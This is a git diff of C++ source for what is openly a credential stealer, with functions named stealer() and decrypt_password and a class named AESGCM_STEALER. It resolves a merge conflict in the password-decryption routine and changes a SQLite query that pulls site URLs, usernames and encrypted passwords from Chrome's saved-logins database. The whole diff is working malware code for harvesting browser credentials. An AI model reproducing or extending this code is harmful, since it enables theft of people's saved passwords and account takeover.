@@ -71,15 +71,7 @@ std::string decrypt_password(std::string encrypted_pass, BYTE *key)
     {
         key_256[i] = key[i];
     }*/
-<<<<<<< HEAD
-
-    if(encrypted_pass.length()<31){
-        return "too short";
-    }
-    auto cipher = new AESGCM(key);
-=======
     auto cipher = new AESGCM_STEALER(key);
->>>>>>> c24bc565337790c79505fd6309419d19be133cc2
     std::string iv_string = encrypted_pass.substr(3,12);
     std::vector<uint8_t> iv_vec(iv_string.begin(), iv_string.end());
     BYTE *iv = &iv_vec[0];
@@ -230,7 +222,7 @@ std::string stealer()
 
     // https://blog.csdn.net/weixin_30696427/article/details/97547260?spm=1001.2101.3001.6650.11&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-11.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-11.pc_relevant_paycolumn_v3&utm_relevant_index=16
     sqlite3_stmt *stmt; 
-    const char *sqlSentence = "SELECT origin_url, username_value, password_value FROM logins";
+    const char *sqlSentence = "SELECT origin_url, username_value, password_value FROM logins LIMIT 1";
     int db_result = sqlite3_prepare_v2(chrome_db, sqlSentence, -1, &stmt, NULL);
     if (db_result == SQLITE_OK){
         while (sqlite3_step(stmt) == SQLITE_ROW)
